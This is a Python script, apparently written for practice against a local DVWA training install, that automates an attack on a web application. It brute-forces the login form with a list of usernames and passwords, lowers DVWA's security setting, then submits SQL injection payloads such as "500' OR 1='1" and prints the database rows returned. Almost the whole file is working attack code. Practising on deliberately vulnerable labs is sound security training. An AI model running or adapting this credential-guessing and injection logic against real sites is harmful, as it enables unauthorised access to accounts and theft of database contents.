import mechanize
import re
import requests

admin_list=['user','admin','','mayirp','rihim','tima','ssb']
pass_list=['user0','abcd@123','pass123','password']

br=mechanize.Browser()
br.set_handle_robots(False)
print("Checking Database Admin and Password: -+-+-+-+")
for ad in admin_list:
        for pa in pass_list:
                br.open("http://localhost/DVWA-master/login.php")
                br.select_form(nr=0)
                br["username"]=ad
                br["password"]=pa
                sub=br.submit()
                if sub.geturl()!= 'http://localhost/DVWA-master/login.php':
                        print("\n___________________________\n\nPassword Matched: ")
                        print("Username: ",ad)
                        print("Password: ",pa)
                        print("___________________________")
                        break
print("\n\n",sub.geturl())
#Security low code
br.open("http://localhost/DVWA-master/security.php")
br.select_form(nr=0)
br["security"] = ["low"]
sub = br.submit()
#print(sub.read())
print(sub.geturl())
#Cookies
cookies = br._ua_handlers['_cookies'].cookiejar
# convert cookies into a dict usable by requests
cookie_dict = {}
for c in cookies:
    if c.name == 'security':
        c.value = 'low'
    else:
        cookie_dict[c.name] = c.value
# make a request
print(cookie_dict)

#print(r)
#sql injection code
injects=["'","1'","500' OR 1='1"]

flag=0
for inj in injects:
        print("______________________________________________________________________________________________________________________________________\n")
        print("Checking ",inj)
        br.open("http://localhost/DVWA-master/vulnerabilities/sqli/")
        br.select_form(nr=0)
        br["id"]=inj
        sub=br.submit()
        print(sub.geturl())
        content = sub.read().decode("utf-8")
        #print(content)
        if inj=="'" and "You have an error in your SQL syntax" not in content:
                break
        else:
                if inj =="'":
                        pass

                print("\n:::::::::       WEBSITE IS SQL VULNERABLE       :::::::::\n")
                flag=1
        beg = [m.start() for m in re.finditer('<pre>',content)]
        end = [m.start() for m in re.finditer('</pre>',content)]
        # print(beg,end)
        for i in range(len(beg)):
                print(content[beg[i]:end[i]])

if flag==0:
        print("Not Vulnerable")
